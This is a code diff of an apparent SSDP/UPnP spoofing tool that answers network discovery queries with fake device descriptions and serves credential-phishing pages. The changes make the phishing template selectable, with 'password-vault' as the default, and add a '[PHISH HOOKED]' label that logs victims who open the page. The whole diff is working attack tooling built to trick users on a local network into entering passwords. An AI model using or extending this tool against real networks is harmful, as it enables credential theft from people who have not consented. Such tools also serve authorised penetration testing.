@@ -19,11 +19,26 @@ ___________     .__.__    _________ _________________ __________
 
 print(banner)
 
+# Set up some nice colors
+class bcolors:
+    GREEN = '\033[92m'
+    BLUE = '\033[94m'
+    ORANGE = '\033[93m'
+    RED = '\033[91m'
+    ENDC = '\033[0m'
+okBox = bcolors.BLUE + '[*] ' + bcolors.ENDC
+noteBox = bcolors.GREEN + '[+] ' + bcolors.ENDC
+warnBox = bcolors.ORANGE + '[!] ' + bcolors.ENDC
+msearchBox = bcolors.BLUE + '[M-SEARCH]     ' + bcolors.ENDC
+xmlBox = bcolors.GREEN +    '[XML REQUEST]  ' + bcolors.ENDC
+phishBox = bcolors.RED +    '[PHISH HOOKED] ' + bcolors.ENDC 
+
 # Handle arguments before moving on....
 parser = argparse.ArgumentParser()
 parser.add_argument('interface', type=str, help='Network interface to listen on.', action='store')
 parser.add_argument('-p', '--port', type=str, help='Port for HTTP server. Defaults to 8888.', action='store')
-parser.add_argument('-n', '--name', type=str, help='Name of the Media Server. Defaults to ePNP Media.', action='store')
+parser.add_argument('-t', '--template', type=str, help='Name of a folder in the templates directory. \
+                     Defaults to "password-vault". This will determine xml and phishing pages used."', action='store')
 args = parser.parse_args()
 
 interface = args.interface
@@ -31,28 +46,22 @@ if args.port:
     localPort = int(args.port)
 else:
     localPort = 8888
-serverName = args.name or 'ePNP Media'
 
-# Set up some nice colors
-class bcolors:
-    GREEN = '\033[92m'
-    BLUE = '\033[94m'
-    ORANGE = '\033[93m'
-    ENDC = '\033[0m'
-okBox = bcolors.BLUE + '[*] ' + bcolors.ENDC
-NoteBox = bcolors.GREEN + '[+] ' + bcolors.ENDC
-warnBox = bcolors.ORANGE + '[!] ' + bcolors.ENDC
-msearchBox = bcolors.BLUE + '[M-SEARCH]     ' + bcolors.ENDC
-httpBox = bcolors.GREEN +   '[HTTP REQUEST] ' + bcolors.ENDC
+if args.template:
+    templateDir = os.path.dirname(__file__) + '/templates/' + args.template
+    if not os.path.isdir(templateDir):
+        print(warnBox + "Sorry, that template directory does not exist. Please double-check and try again.")
+        sys.exit()
+else:
+    templateDir = os.path.dirname(__file__) + '/templates/password-vault'
 
 
 class SSDPListener:
-    def __init__(self, localIp, localPort, serverName):
+    def __init__(self, localIp, localPort):
         self.sock = None
         self.knownHosts = []
         self.localIp = localIp
         self.localPort = localPort
-        self.serverName = serverName
         ssdpPort = 1900			# This is defined by the SSDP spec, do not change
         mcastGroup='239.255.255.250'	# This is defined by the SSDP spec, do not change
         serverAddress = ('', ssdpPort)
@@ -100,8 +109,12 @@ def MakeHTTPClass(deviceXML, serviceXML, phishPage):
             headers = self.headers['user-agent']
             verb = self.command
             path = self.path
-            print(httpBox + "Host: {}, User-Agent: {}".format(address, headers))
-            print("               {} {}".format(verb, path))
+            if 'xml' in self.path:
+                print(xmlBox + "Host: {}, User-Agent: {}".format(address, headers))
+                print("               {} {}".format(verb, path))
+            else:
+                print(phishBox + "Host: {}, User-Agent: {}".format(address, headers))
+                print("               {} {}".format(verb, path))
 
     return DeviceDescriptor 
 
@@ -144,30 +157,25 @@ def send_location(listener, address, requestedST):
     reply = bytes(reply, 'utf-8')
     listener.sock.sendto(reply, address)
 
-def buildDeviceXML(deviceType):
-    variables = {'deviceType': deviceType,
-		 'localIp': localIp,
+def buildDeviceXML():
+    variables = {'localIp': localIp,
 		 'localPort': localPort}
-    scriptDir = os.path.dirname(__file__)
-    fileIn = open(scriptDir + '/templates/{}-device'.format(deviceType))
+    fileIn = open(templateDir + '/device.xml')
     template = Template(fileIn.read())
     xmlFile = template.substitute(variables)
     return xmlFile
 
-def buildServiceXML(deviceType):
-    variables = {'deviceType': deviceType,
-		 'localIp': localIp,
+def buildServiceXML():
+    variables = {'localIp': localIp,
 		 'localPort': localPort}
-    scriptDir = os.path.dirname(__file__)
-    fileIn = open(scriptDir + '/templates/{}-service'.format(deviceType))
+    fileIn = open(templateDir + '/service.xml')
     template = Template(fileIn.read())
     xmlFile = template.substitute(variables)
     return xmlFile
 
-def buildPhish(template):
+def buildPhish():
     variables = {'localIp': localIp}
-    scriptDir = os.path.dirname(__file__)
-    fileIn = open(scriptDir + '/templates/phish-{}'.format(template))
+    fileIn = open(templateDir + '/present.html')
     template = Template(fileIn.read())
     phishPage = template.substitute(variables)
     return phishPage
@@ -180,7 +188,7 @@ def serve_descriptor(deviceXML, serviceXML, phishPage):
 
 def listen_msearch():
     print(okBox + "Listening for MSEARCH queries using {}.".format(interface))
-    listener = SSDPListener(localIp, localPort, serverName)
+    listener = SSDPListener(localIp, localPort)
     while True:
         data, address = listener.sock.recvfrom(1024)
         process_data(listener, data, address)
@@ -189,9 +197,9 @@ def listen_msearch():
 def main():
     global localIp
     localIp = get_ip(interface)
-    deviceXML = buildDeviceXML('upnp-basic')
-    serviceXML = buildServiceXML('upnp-basic')
-    phishPage = buildPhish('bitcoin')
+    deviceXML = buildDeviceXML()
+    serviceXML = buildServiceXML()
+    phishPage = buildPhish()
     Process(target=serve_descriptor, args=(deviceXML, serviceXML, phishPage)).start()
     listen_msearch()
     
